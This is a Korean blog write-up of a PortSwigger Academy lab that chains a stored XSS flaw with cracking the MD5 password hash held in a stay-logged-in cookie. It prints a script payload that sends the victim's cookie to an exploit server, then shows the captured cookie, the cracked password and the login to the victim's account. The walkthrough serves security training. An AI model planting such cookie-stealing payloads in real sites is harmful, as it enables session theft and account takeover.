---
title: Authentication 실습(7) - Offline password cracking (PortSwigger Academy)
description: XSS 취약점을 이용해 victim의 stay-logged-in 쿠키를 탈취하고 password hash를 offline으로 크랙하여 계정을 탈취하는 공격
categories: [Web Security, Authentication Vulnerabilities, Lab]
tags: [웹 보안, 실습, PortSwigger Academy]
toc: true
---

# Lab: Offline password cracking

Lab Link: [Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)

---

## 핵심 포인트

이번 lab은 이전 stay-logged-in cookie lab에서 이어지는 내용이다.  
쿠키 구조를 분석하는 단계에서 한 단계 더 나아가, 이번에는 XSS를 이용해 victim의 쿠키를 탈취한다.

- **stay-logged-in cookie에 password hash 저장**
- **comment 기능에 Stored XSS 존재**

remember-me 쿠키에는 다음 정보가 포함된다.

```
username:md5(password)
```

따라서 공격자가 victim의 쿠키를 탈취하면  
**password hash를 확보할 수 있다.**

이 hash는 서버와 상호작용할 필요 없이  
**offline 환경에서 cracking**이 가능하다.

공격 흐름은 다음과 같다.

1. stay-logged-in cookie 구조 분석  
2. XSS를 이용해 victim cookie 탈취  
3. password hash 획득  
4. offline password cracking  
5. victim 계정 로그인

---

## Solution

### 1. stay-logged-in cookie 구조 확인

이전 랩에서 stay-logged-in cookie lab 진행했던것과 동일하다.

<div class="img-left-block">
<img src="/assets/burp_images/authentication-lab/auth-bruteforce_lab7-0.png" alt="설명" width="600">
</div>

`wiener:peter` 계정으로 로그인 한 뒤  
Base64로 인코딩되어 있는 문자열을 디코딩 진행.
```
wiener:51dc30ddc473d43a6011e9ebba6ca770 
```
형태를 보면 `username:md5(password)`구조라는 것을 알 수 있다.

MD5 Hash를 사용한다는것 까지 저번 시간에 다뤘던 부분이라 생략 하도록 하겠다.

---

### 2. XSS 취약점 확인

블로그 댓글 기능을 확인해 보면  
**Stored XSS 취약점**이 존재한다.

공격자는 이 취약점을 이용해 victim의 쿠키를 탈취할 수 있다.

먼저 lab에서 제공되는 **Exploit Server** URL 로 접속
`https://exploit-0a980072044b40448d1b3b300199008b.exploit-server.net/exploit`

victim 브라우저에서 XSS가 실행되면 cookie값이 이 **Exploit Server**로 전송된다.

---

### 3. XSS payload 작성

블로그 댓글에 다음 payload를 입력한다.

<div class="img-left-block">
<img src="/assets/burp_images/authentication-lab/auth-bruteforce_lab7-1.png" alt="설명" width="700">
</div>

```html
<script>
document.location='https://exploit-0a980072044b40448d1b3b300199008b.exploit-server.net/exploit'+document.cookie
</script>
```

이 payload는 victim이 댓글을 열람할 때  
브라우저의 cookie 값을 exploit server로 전송한다.

---

### 4. victim cookie 탈취

Exploit Server에서 **Access log**를 확인한다.

victim이 댓글을 확인하면 다음과 같은 요청이 기록된다.

<div class="img-left-block">
<img src="/assets/burp_images/authentication-lab/auth-bruteforce_lab7-2.png" alt="설명" width="1000">
</div>

```
GET /exploitsecret=GbtZ9Ysuwd2rxNR6SHqX7jQeIm8Wuu3D;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```
요청 URL 끝에 `stay-logged-in` cookie 값이 그대로 전달된 것을 확인할 수 있다.  
이 값이 **Carlos의 stay-logged-in cookie**다.

---

### 5. cookie 디코딩

Burp Decoder에서 해당 값을 Base64 디코딩한다.

<div class="img-left-block">
<img src="/assets/burp_images/authentication-lab/auth-bruteforce_lab7-3.png" alt="설명" width="400">
</div>

```
carlos:26323c16d5f4dabff3bb136f2460a943
```

여기서 `carlos`뒤의 값은 **password MD5 hash**다.

---

### 6. password cracking 혹은 password db 조회

이 hash를 검색 엔진이나 password database에 입력해 보면  
`password: onceuponatime` 라는걸 확인할 수 있다.

<div class="img-left-block">
<img src="/assets/burp_images/authentication-lab/auth-bruteforce_lab7-4.png" alt="설명" width="1000">
</div>

실제 환경에서는 **hashcat**이나 **john the ripper** 도구를 이용해  
offline cracking을 진행 할 수 있다.

---

### 7. Carlos 계정 접근

찾은 password로 Carlos 계정에 로그인한다.

```
Username: carlos
Password: onceuponatime
```

로그인 이후 **My account 페이지**로 이동한다.

<div class="img-left-block">
<img src="/assets/burp_images/authentication-lab/auth-bruteforce_lab7-5.png" alt="설명" width="400">
</div>

계정 삭제 버튼을 누르면 lab이 해결된다.

---

## 정리

이 lab에서는 두 가지 취약점이 결합되어 공격이 가능했다.

1. remember-me cookie에 password hash 저장  
2. Stored XSS를 통한 cookie 탈취

공격자는 다음 과정을 통해 계정을 탈취했다.

```
XSS
→ cookie 탈취
→ password hash 확보
→ offline password cracking
→ 계정 로그인
```

password hash가 노출되면 서버와 상호작용 없이  
offline 환경에서 공격이 가능하다는 점이 핵심이다.

즉 rate limit 같은 서버 방어 로직을 완전히 우회할 수 있다.